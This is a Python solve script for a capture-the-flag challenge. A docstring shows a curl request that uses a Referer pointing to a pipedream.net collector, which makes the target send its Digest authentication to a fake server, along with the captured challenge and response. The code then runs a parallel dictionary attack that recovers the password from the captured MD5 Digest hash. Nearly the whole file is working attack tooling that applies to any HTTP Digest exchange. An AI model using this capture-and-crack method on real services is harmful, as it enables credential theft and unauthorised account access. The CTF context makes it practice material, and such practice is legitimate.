import hashlib
import time
import os
import multiprocessing

# mimic the attack to redirect payload
"""
# attack
authman % curl -X GET \
  -H "Referer: https://enlfg657jrgdt6s.m.pipedream.net" \
  https://authman.challs.pwnoh.io/api/check
{"status":401}

# the fake server
$respond({
    status: 401,
    body: `Unauthorized`,
    headers: {
      "WWW-Authenticate":`Digest realm="Authentication Required",qop="auth",nonce="df9bed82a7869058de3a81b48ff4ac70",opaque="ac42eeb89aca5c6f29d14e4fbb66e0d4",algorithm="MD5",qop="auth"`,
    }
    });

# the client request with payload
Digest username="keno", realm="Authentication Required", nonce="df9bed82a7869058de3a81b48ff4ac70", uri="/auth", response="ff2cad22ae733f3526a67f950c95def8", opaque="ac42eeb89aca5c6f29d14e4fbb66e0d4", algorithm="MD5", qop="auth", nc=00000001, cnonce="07d8a87d874db27f"
"""

# --- 1. CAPTURED DIGEST PARAMETERS ---

# Server Challenge (WWW-Authenticate) Parameters
KNOWN_REALM = "Authentication Required"
KNOWN_NONCE = "df9bed82a7869058de3a81b48ff4ac70"

# Client Request (Authorization) Parameters
KNOWN_USERNAME = "keno"
KNOWN_URI = "/auth"
KNOWN_QOP = "auth"
KNOWN_NC = "00000001"
KNOWN_CNONCE = "d4de588228119e3f"
TARGET_RESPONSE = "a79cf3829f4339a046feb15e86bfb098" # The hash we need to match
KNOWN_METHOD = "GET" # Assumption: Must be the method used by the client

# --- 2. HASHING UTILITIES ---

def calculate_md5(input_string: str) -> str:
    """Calculates the MD5 hash and returns the lowercase hex string."""
    return hashlib.md5(input_string.encode('utf-8')).hexdigest()

def calculate_ha1(username: str, realm: str, password_guess: str) -> str:
    """Calculates HA1: MD5(username : realm : password)"""
    input_string = f"{username}:{realm}:{password_guess}"
    return calculate_md5(input_string)

def calculate_ha2(method: str, uri: str) -> str:
    """Calculates HA2: MD5(method : uri)"""
    input_string = f"{method}:{uri}"
    return calculate_md5(input_string)

def calculate_final_response(ha1: str, nonce: str, nc: str, cnonce: str, qop: str, ha2: str) -> str:
    """Calculates the final response hash: MD5(HA1 : nonce : nc : cnonce : qop : HA2)"""
    input_string = f"{ha1}:{nonce}:{nc}:{cnonce}:{qop}:{ha2}"
    return calculate_md5(input_string)

# --- 3. ATTACK LOGIC ---

# Pre-calculate constant HA2
HA2_static = calculate_ha2(KNOWN_METHOD, KNOWN_URI)

def check_password(password_guess):
    """Checks if a password guess is correct."""
    HA1_guess = calculate_ha1(KNOWN_USERNAME, KNOWN_REALM, password_guess)
    calculated_response = calculate_final_response(
        HA1_guess,
        KNOWN_NONCE,
        KNOWN_NC,
        KNOWN_CNONCE,
        KNOWN_QOP,
        HA2_static
    )
    if calculated_response == TARGET_RESPONSE:
        return password_guess
    return None

def main():
    print("--- DIGEST DICTIONARY ATTACK SIMULATION ---")
    print(f"Target Hash (Captured Response): {TARGET_RESPONSE}")
    print(f"HA2 (Static Hash of {KNOWN_METHOD}:{KNOWN_URI}): {HA2_static}\n")

    wordlist_path = "wordlist.txt"
    if not os.path.exists(wordlist_path):
        print(f"Error: {wordlist_path} not found.")
        return

    print("Starting dictionary attack...")
    start_time = time.time()
    password_found = None

    try:
        with open(wordlist_path, "r", encoding='utf-8', errors='ignore') as file_handle:
            passwords = [line.strip() for line in file_handle]
        
        pool = multiprocessing.Pool()
        
        # Use imap_unordered for efficiency. It returns results as they complete.
        # This allows us to stop as soon as we find the password.
        for i, result in enumerate(pool.imap_unordered(check_password, passwords)):
            if (i + 1) % 100000 == 0:
                print(f"Checked {i+1}/{len(passwords)} passwords...")
            if result:
                password_found = result
                pool.terminate() # Stop all other processes
                break
        
        pool.close()
        pool.join()

    except FileNotFoundError:
        print(f"\nError: {wordlist_path} not found.")

    # --- 4. OUTPUT RESULTS ---

    if password_found:
        print("\n" + "="*50)
        print("!!! DICTIONARY ATTACK SUCCESS !!!")
        print(f"Username: {KNOWN_USERNAME}")
        print(f"PASSWORD RECOVERED: '{password_found}'")
        # The calculated_response is not available here, but we know it matches TARGET_RESPONSE
        print(f"Calculated Hash: {TARGET_RESPONSE}")
        print(f"Attack Time: {time.time() - start_time:.4f} seconds")
        print("="*50)
    else:
        print("\n[ATTACK FAILED] Password not found in the wordlist.")

if __name__ == '__main__':
    main()
